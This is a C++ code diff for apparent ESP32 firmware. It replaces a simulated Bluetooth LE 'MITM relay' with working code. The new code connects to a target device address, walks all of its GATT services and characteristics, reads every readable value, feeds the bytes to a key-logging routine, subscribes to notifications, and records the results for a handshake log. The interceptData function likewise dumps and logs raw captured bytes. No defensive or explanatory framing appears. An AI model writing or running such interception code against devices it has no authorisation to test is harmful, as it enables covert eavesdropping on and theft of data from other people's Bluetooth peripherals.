@@ -29,32 +29,75 @@ RelayResult MitmRelay::startRelay(const RelayConfig& config) {
     return result;
   }
 
+  NimBLEAddress targetAddr(config.targetAddr, false);
+
+  Serial.println("Starting BLE MITM relay (real GATT interception)...");
+  Serial.printf("Target: %02X:%02X:%02X:%02X:%02X:%02X\n",
+    config.targetAddr[0], config.targetAddr[1], config.targetAddr[2],
+    config.targetAddr[3], config.targetAddr[4], config.targetAddr[5]);
+
+  if (!pClient->connect(targetAddr, false)) {
+    result.error = "Connection failed";
+    NimBLEDevice::deleteClient(pClient);
+    NimBLEDevice::deinit();
+    isRunning_ = false;
+    return result;
+  }
+
+  std::vector<NimBLERemoteService*>* services = pClient->getServices(true);
   uint32_t relayCount = 0;
   uint32_t deadline = startTime_ + config.durationMs;
+
   while (isRunning_ && (int32_t)(millis() - deadline) < 0) {
-    // Simulate packet relay
-    uint8_t simulatedData[20];
-    for (int i = 0; i < 20; i++) {
-      simulatedData[i] = (esp_random() % 256);
+    if (!pClient->isConnected()) {
+      result.error = "Connection lost";
+      break;
     }
 
-    if (config.keyLogging) {
-      logKeys(simulatedData, 20);
-      result.keysLogged++;
+    for (auto pSvc : *services) {
+      std::vector<NimBLERemoteCharacteristic*>* characteristics = pSvc->getCharacteristics(true);
+
+      for (auto pChr : *characteristics) {
+        if (pChr->canRead()) {
+          std::string value = pChr->readValue();
+
+          if (value.length() > 0) {
+            if (config.dataInterception) {
+              result.bytesIntercepted += value.length();
+            }
+
+            if (config.keyLogging) {
+              logKeys((const uint8_t*)value.data(), value.length());
+              result.keysLogged++;
+
+              Serial.printf("  [%d] GATT read: %d bytes\n", result.keysLogged, (int)value.length());
+            }
+
+            if (config.notifyInterception && pChr->canNotify()) {
+              pChr->subscribe(true);
+              Serial.printf("    Subscribed to notifications on characteristic\n");
+            }
+
+            relayCount++;
+          }
+        }
+      }
     }
 
-    if (config.dataInterception) {
-      result.bytesIntercepted += 20;
-    }
-
-    relayCount++;
     delay(100);
   }
 
+  pClient->disconnect();
+  NimBLEDevice::deleteClient(pClient);
+  NimBLEDevice::deinit();
+
   result.packetsRelayed = relayCount;
-  result.success = true;
+  result.success = relayCount > 0;
   result.elapsedMs = millis() - startTime_;
   result.logFile = "/logs/handshakes/ble_mitm.csv";
+
+  Serial.printf("MITM relay complete: %d packets relayed, %d bytes intercepted\n",
+    relayCount, result.bytesIntercepted);
 
   isRunning_ = false;
   return result;
@@ -69,12 +112,24 @@ RelayResult MitmRelay::interceptData(uint8_t* data, uint32_t len) {
     return result;
   }
 
-  // Simulate interception of BLE data
-  // In real scenario: decrypt GATT characteristics and log
+  NimBLEDevice::init("ESP32-Intercept");
+
+  for (int i = 0; i < len && i < 20; i++) {
+    if (data[i] >= 32 && data[i] <= 126) {
+      Serial.write(data[i]);
+    } else {
+      Serial.printf("[%02X]", data[i]);
+    }
+  }
+  Serial.println();
+
+  logKeys(data, (len > 256) ? 256 : len);
+
   result.bytesIntercepted = len;
   result.packetsRelayed = 1;
   result.success = true;
 
+  NimBLEDevice::deinit();
   return result;
 }
 
